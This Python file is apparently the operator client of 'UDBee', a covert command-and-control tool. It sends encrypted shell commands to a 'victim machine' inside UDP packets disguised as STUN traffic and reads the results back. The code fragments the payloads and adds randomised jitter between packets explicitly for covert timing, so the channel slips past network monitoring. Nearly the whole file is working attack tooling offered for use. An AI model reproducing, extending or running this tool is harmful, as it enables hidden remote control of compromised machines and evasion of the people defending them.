import rsa, socket, random, time, sys, threading, argparse, base64, struct, html
from decryption import decrypt_message
from encryption import encrypt_message
from message_fragmentation import fragment_message
from port import get_available_port
from stun import build_stun_message
from prompt_toolkit import prompt
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit.shortcuts import print_formatted_text

# Logging helpers for consistent output
def log_info(msg): print_formatted_text(HTML(f"<ansiyellow>[ INFO ]</ansiyellow> {msg}"))
def log_error(msg): print_formatted_text(HTML(f"<ansired>[ ERR ]</ansired> {msg}"))
def log_success(msg): print_formatted_text(HTML(f"<ansigreen>[ SUCCESS ]</ansigreen> {msg}"))
def log_warn(msg): print_formatted_text(HTML(f"<ansiyellow>[ WARN ]</ansiyellow> {msg}"))

# Argument parsing for user configuration
parser = argparse.ArgumentParser(description="UDBee - UDP Covert Channel Tool")
parser.add_argument("-ip", required=True, type=str, help="Target IP address, IPv4 only")
parser.add_argument("-port", default=27381 ,type=int, help="Target port, default is 27381")
parser.add_argument("-fragments", type=int, default=12, help="Fragment size, default is 12 byte")
parser.add_argument("-chunk", type=int, default=10, help="Chunk size in KB unit, default is 10KB byte")
parser.add_argument("-delay", type=float, default=round((random.uniform(0, 3)), 1), help="Delay between fragments, default is a float number between 0 and 3")
parser.add_argument("-buffer", type=float, default=10000, help="Fragments buffer, default is 10000 (to prevent memory overflow)")
parser.add_argument("-jitter", type=float, default=0.2, help="Random +/- jitter to apply on each fragment delay")

args = parser.parse_args()

target_ip = args.ip
target_port = args.port
chunk_size = args.fragments
delay = args.delay
received_chunk_size = args.chunk * 1024  # Convert KB to bytes
buffer_size = args.buffer
max_data_allowed = buffer_size * received_chunk_size  # Maximum data size allowed in the buffer
jitter = args.jitter
total_data_size = 0
target_pub_key = None
my_pub_key = None
my_priv_key = None
transmitted_messages = 0

# Parses a string representation of an RSA public key
def parse_public_key(text: str) -> rsa.PublicKey:
    try:
        text = text.replace("PublicKey(", "").replace(")", "")
        n_str, e_str = text.split(",")
        n = int(n_str.strip())
        e = int(e_str.strip())
        return rsa.PublicKey(n, e)
    except:
        return None  # Return None if parsing fails

# Handles the initial key exchange with the target
def exchange_keys():
    start_time = time.time()
    exchange_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            listening_port = get_available_port()
            exchange_sock.bind(("0.0.0.0", listening_port))
            break
        except:
            continue
    if my_pub_key is None or target_pub_key is None:
        log_error("<ansimagenta>Encryption keys was not exchanged, started exchanging now.</ansimagenta>")
    else:
        log_info("<ansimagenta>Generating a new RSA keys, exchanging keys now.</ansimagenta>")
    exchange_sock.sendto(build_stun_message("gen_key"), (target_ip, target_port))
    exchange_sock.close()
    get_response(listening_port, start_time)
    return

# Listens for incoming UDP fragments and handles key exchange or message decryption
def get_response(port, start_time):
    global target_pub_key, buffer_size, chunk_size, total_data_size, max_data_allowed, target_ip, my_pub_key, my_priv_key, transmitted_messages
    ip = "0.0.0.0"
    received_chunks = {}
    excpected_chunks = None
    total_data_size = 0

    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            listen_socket.bind((ip, port))
            break
        except:
            continue
    listen_socket.settimeout(60)
    
    log_info(f"<ansicyan>listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>")
    try:
        while True:
            data, addr = listen_socket.recvfrom(2048)
            transmitted_messages += 1
            if len(data) < 20:
                continue
            header = data[:20]
            attributes = data[20:]
            if len(attributes) < 4:
                continue
            msg_type, msg_length = struct.unpack('!HH', header[:4])
            magic_cookie = struct.unpack('!I', header[4:8])[0]
            if magic_cookie != 0x2112A442:
                continue
            attr_type, attr_length = struct.unpack('!HH', attributes[:4])
            data = attributes[4:4+attr_length]

            victim_ip, victim_port = addr
            part, total, index = data.decode('utf8').split('|', 2)
            total = int(total)
            index = int(index)
            total_data_size += len(part)

            # Ignore packets from unexpected sources
            if victim_ip != target_ip:
                continue
            # Prevent buffer overflow
            total_chunks_received = len(received_chunks)
            if total_chunks_received > buffer_size:
                listen_socket.close()
                log_warn(f"<ansired>Remote tried to send more fragments than allowed ({total_chunks_received}/{buffer_size}). Aborting.</ansired>")
                log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>, buffer maximum size is reached!</ansicyan>")
                received_chunks = {}
                excpected_chunks = None
                return
            if total_data_size > max_data_allowed:
                listen_socket.close()
                log_warn(f"<ansired>Remote tried to send more data than allowed ({total_data_size}/{max_data_allowed}). Aborting.</ansired>")
                log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>, buffer maximum size is reached!</ansicyan>")
                received_chunks = {}
                excpected_chunks = None
                return
            # Handle key exchange
            if part.startswith("PublicKey("):
                transmitted_messages += 3
                target_pub_key = parse_public_key(part)
                ( my_pub_key, my_priv_key ) = rsa.newkeys(512)
                listen_socket.sendto(build_stun_message(f"PublicKey({my_pub_key.n}, {my_pub_key.e})".encode('utf8')), (target_ip, target_port))
                log_success("<ansiblue>Successfully exchanged keys, you can now send commands securely.</ansiblue>")
                listen_socket.close()
                end_time = time.time()
                latency = end_time - start_time
                log_info(f"<ansiyellow>latency:</ansiyellow> <ansimagenta>{latency:.2f} seconds</ansimagenta>")
                    
                log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>")
                return

            if excpected_chunks == None:
                excpected_chunks = total
            
            received_chunks[index] = part
            # If all fragments are received, attempt to reassemble and decrypt
            if len(received_chunks) == excpected_chunks:
                try:
                    full_response = ''.join(received_chunks[i] for i in sorted(received_chunks))
                    decoded_response = base64.b64decode(full_response)
                    decrypted_message = decrypt_message(decoded_response, my_priv_key)
                    if decrypted_message["status"] == 200:
                        full_response = html.escape(decrypted_message["message"])
                    else:
                        log_error(f"<ansired>Failed to decrypt a response received from <ansigreen>{victim_ip}:{victim_port}</ansigreen>, decryption key doesn't match</ansired>")
                        return
                    log_info(f"<ansicyan>received a response from</ansicyan> <ansigreen>{victim_ip}:{victim_port}</ansigreen><ansicyan> :</ansicyan>")
                    print_formatted_text(HTML(f"<ansigreen>{full_response}</ansigreen>"))
                    listen_socket.close()
                    end_time = time.time()
                    latency = end_time - start_time
                    log_info(f"<ansiyellow>total packets transmitted: {transmitted_messages}</ansiyellow>")
                    log_info(f"<ansiyellow>latency:</ansiyellow> <ansimagenta>{latency:.2f} seconds</ansimagenta>")
                    log_info(f"<ansicyan>stopped listening on</ansicyan> <ansigreen>{ip}</ansigreen><ansicyan>:</ansicyan><ansigreen>{port}</ansigreen><ansicyan>...</ansicyan>")
                    return
                except:
                    log_error(f"<ansired>Failed to decrypt a response received from <ansigreen>{victim_ip}:{victim_port}</ansigreen>, there was an unknown problem.</ansired>")
    except socket.timeout:
        log_error("<ansimagenta>socket timedout while waiting for response.</ansimagenta>")
    except:
        log_error("<ansimagenta>there was an error while trying to get response</ansimagenta>")
    finally:
        if listen_socket:
            listen_socket.close()

# Encrypts and sends a command to the target, fragmenting as needed
def send_command(message, listening_port):
    try:
        global my_priv_key, delay, jitter, target_ip, target_port, my_pub_key, target_pub_key
        attacking_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                attacking_sock.bind(("0.0.0.0", listening_port))
                break
            except:
                continue

        # Ensure key exchange has occurred
        if target_pub_key == None:
            exchange_keys()
        
        # Combine AES-encrypted message and RSA-encrypted AES key, then base64 encode
        encrypted_message = encrypt_message(message, target_pub_key)

        if encrypted_message["status"] == 200:
            encrypted_message = encrypted_message["message"].encode('utf8')
        else:
            log_error("<ansired>Failed to provide an encrypted connection, message was not sent.</ansired>")
            return
        encrypted_message = base64.b64encode(encrypted_message).decode('utf8')
        chunks = fragment_message(encrypted_message, listening_port, chunk_size)
        for chunk in chunks:
            chunk = build_stun_message(chunk)
            attacking_sock.sendto(chunk, (target_ip, target_port))
            # Add jitter to delay for covert timing
            jitter_delay = delay + random.uniform(-jitter, jitter)
            jitter_delay = max(0, jitter_delay)
            time.sleep(jitter_delay)
        attacking_sock.close()
    except Exception as e:
        print(e)
        

def main():
    with patch_stdout():
        global my_pub_key, my_priv_key, target_pub_key
        # Print logo and intro
        logo = f"""
<ansiyellow>
    █    ██ ▓█████▄  ▄▄▄▄   ▓█████ ▓█████ 
    ██  ▓██▒▒██▀ ██▌▓█████▄ ▓█   ▀ ▓█   ▀ 
    ▓██  ▒██░░██   █▌▒██▒ ▄██▒███   ▒███   
    ▓▓█  ░██░░▓█▄   ▌▒██░█▀  ▒▓█  ▄ ▒▓█  ▄ 
    ▒▒█████▓ ░▒████▓ ░▓█  ▀█▓░▒████▒░▒████▒
    ░▒▓▒ ▒ ▒  ▒▒▓  ▒ ░▒▓███▀▒░░ ▒░ ░░░ ▒░ ░
    ░░▒░ ░ ░  ░ ▒  ▒ ▒░▒   ░  ░ ░  ░ ░ ░  ░
    ░░░ ░ ░  ░ ░  ░  ░    ░    ░      ░   
    ░        ░     ░         ░  ░   ░  ░
            ░            ░
</ansiyellow>"""
        print_formatted_text(HTML(logo))
        print_formatted_text(HTML("\t🐝 <ansimagenta>UDBee</ansimagenta> <ansicyan>–</ansicyan> <ansigreen>Because TCP Is Too Mainstream</ansigreen>"))
        print_formatted_text(HTML("\t<ansimagenta>GitHub:</ansimagenta> <ansicyan>@MoMhaidat05</ansicyan>"))
        exchange_keys()
        while True:
            command = prompt(HTML('\n<ansicyan>UDBee</ansicyan> <ansimagenta>> </ansimagenta>')).strip()
            if command.lower() in ["exit", "quit"]:
                print_formatted_text(HTML("<ansigreen>Stopped buzzing :)</ansigreen>"))
                sys.exit(1)

            elif command.lower() == "help":
                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>my_keys</ansigreen> : <ansiblue>show my public and private keys</ansiblue>\n<ansigreen>target_key</ansigreen> : <ansiblue>show target public key</ansiblue>\n<ansigreen>gey_keys</ansigreen> : <ansiblue>generate a new RSA keys on attacker and client side</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
                continue

            elif command.startswith("gen_keys"):
                exchange_keys()
                continue
            elif command.startswith("my_keys"):
                if my_pub_key is None or my_priv_key is None:
                    log_error("<ansired>Encryption keys was not exchanged, please exchange keys first.</ansired>")
                    continue
                log_info(f"<ansiblue>My public key:</ansiblue> <ansigreen>{my_pub_key})</ansigreen>")
                log_info(f"<ansiblue>My private key:</ansiblue> <ansigreen>{my_priv_key}</ansigreen>")
                continue
            elif command.startswith("target_key"):
                if target_pub_key is None:
                    log_error("<ansired>Target public key was not exchanged, please exchange keys first.</ansired>")
                    continue
                log_info(f"<ansiblue>Target public key:</ansiblue> <ansigreen>{target_pub_key}</ansigreen>")
                continue
            else:
                # Allow user to force command execution if it conflicts with a special command
                if command.startswith("exec:"):
                    command = command.replace("exec:","")
                if command == "":
                    log_error("<ansired>Command cannot be empty, please provide a valid command.</ansired>")
                    continue
                port = get_available_port()

                # Use threads to send command and listen for response simultaneously
                threads = []
                start_time = time.time()
                t1 = threading.Thread(target=send_command, args=(command, port))
                t2 = threading.Thread(target=get_response, args=(port,start_time))
                threads.append(t1)
                threads.append(t2)

                for thread in threads:
                    thread.start()
                
                for thread in threads:
                    thread.join()
                

main()
